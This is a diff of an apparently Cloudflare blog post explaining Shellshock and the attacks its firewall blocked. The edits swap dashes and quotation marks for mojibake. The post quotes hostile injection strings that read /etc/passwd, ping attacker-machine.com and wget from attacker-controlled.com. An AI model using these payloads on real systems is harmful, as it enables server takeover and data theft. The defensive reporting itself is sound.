@@ -8,7 +8,7 @@
 		<small>(CC BY 2.0 <a href="https://www.flickr.com/photos/aussiegall">aussiegall</a>)</small>
 	</p>
 	<h2 id="eject">Eject</h2>
-	<p>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution (ACE)</a> vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</p>
+	<p>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution (ACE)</a> vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly languageâ€”in short, this type of attack requires an expert.</p>
 	<p>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a "shell". A shell is a command-line where commands can be entered and executed.</p>
 	<p>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</p>
 	<p>Suppose for a moment that you wanted to attack a web server and make its CD or DVD drive slide open. There's actually a command on Linux that will do that: <code>/bin/eject</code>. If a web server is vulnerable to Shellshock you could attack it by adding the magic string <code>() { :; };</code> to <code>/bin/eject</code> and then sending that string to the target computer over HTTP. Normally, the <code>User-Agent</code> string would identify the type of browser you are using, but, in in the case of the Shellshock vulnerability, it can be set to say anything.</p>
@@ -55,7 +55,7 @@ HTTP_HOST=cloudflare.com
 	<p>At about 0100 Pacific (1000 in Paris) the attacks from France ceased. We are currently seeing around 5 attacks per second. At the time of writing, we've blocked well over 1.1m Shellshock attacks.</p>
 	<h2 id="letyourimaginationrunwild">Let your imagination run wild</h2>
 	<p>Since its so easy to attack vulnerable machines with Shellshock, and because a vulnerable machine will run any command sent to it, attackers have let their imaginations run wild with ways to manipulate computers remotely.</p>
-	<p>CloudFlare’s WAF logs the reason it blocked a request allowing us to extract and analyze the actual Shellshock strings being used. Shellshock is being used primarily for reconnaissance: to extract private information, and to allow attackers to gain control of servers.</p>
+	<p>CloudFlareâ€™s WAF logs the reason it blocked a request allowing us to extract and analyze the actual Shellshock strings being used. Shellshock is being used primarily for reconnaissance: to extract private information, and to allow attackers to gain control of servers.</p>
 	<p>Most of the Shellshock commands are being injected using the HTTP User-Agent and Referer headers, but attackers are also using GET and POST arguments and other random HTTP headers.</p>
 	<p>To extract private information, attackers are using a couple of techniques. The simplest extraction attacks are in the form:</p>
 	<pre><code>() {:;}; /bin/cat /etc/passwd
@@ -71,12 +71,12 @@ HTTP_HOST=cloudflare.com
 		<small>(CC BY 2.0 <a href="https://www.flickr.com/photos/jdhancock">JD Hancock</a>)</small>
 	</p>
 	<h2 id="reconnaissance">Reconnaissance</h2>
-	<p>By far the most popular attack we've seen (around 83% of all attacks) is called “reconnaissance”. In reconnaissance attacks, the attacker sends a command that will send a message to a third-party machine. The third-party machine will then compile a list of all the vulnerable machines that have contacted it.</p>
+	<p>By far the most popular attack we've seen (around 83% of all attacks) is called â€œreconnaissanceâ€. In reconnaissance attacks, the attacker sends a command that will send a message to a third-party machine. The third-party machine will then compile a list of all the vulnerable machines that have contacted it.</p>
 	<p>In the past, we've seen lists of compromised machines being turned into botnets for DDoS, spam, or other purposes.</p>
 	<p>A popular reconnaissance technique uses the <code>ping</code> command to get a vulnerable machine to send a single packet (called a ping) to a third-party server that the attacker controls. The attack string looks like this:</p>
 	<pre><code>() {:;}; ping -c 1 -p cb18cb3f7bca4441a595fcc1e240deb0 attacker-machine.com
 </code></pre>
-	<p>The <code>ping</code> command is normally used to test whether a machine is “alive” or online (an alive machine responds with its own ping). If a web server is vulnerable to Shellshock then it will send a single ping packet (the <code>-c 1</code>) to attacker-machine.com with a payload set by the <code>-p</code>. The payload is a unique ID created by the attacker so they can trace the ping back to the vulnerable web site.</p>
+	<p>The <code>ping</code> command is normally used to test whether a machine is â€œaliveâ€ or online (an alive machine responds with its own ping). If a web server is vulnerable to Shellshock then it will send a single ping packet (the <code>-c 1</code>) to attacker-machine.com with a payload set by the <code>-p</code>. The payload is a unique ID created by the attacker so they can trace the ping back to the vulnerable web site.</p>
 	<p><img src="https://blog.cloudflare.com/content/images/2014/09/illustration-bash-blog.png" alt="" loading="lazy"></p>
 	<p>Another technique being used to identify vulnerable servers is to make the web server download a web page from an attacker-controlled machine. The attacker can then look in their web server logs to find out which machine was vulnerable. This attack works by sending a Shellshock string like:</p>
 	<pre><code>() {:;}; /usr/bin/wget http://attacker-controlled.com/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== &gt;&gt; /dev/null
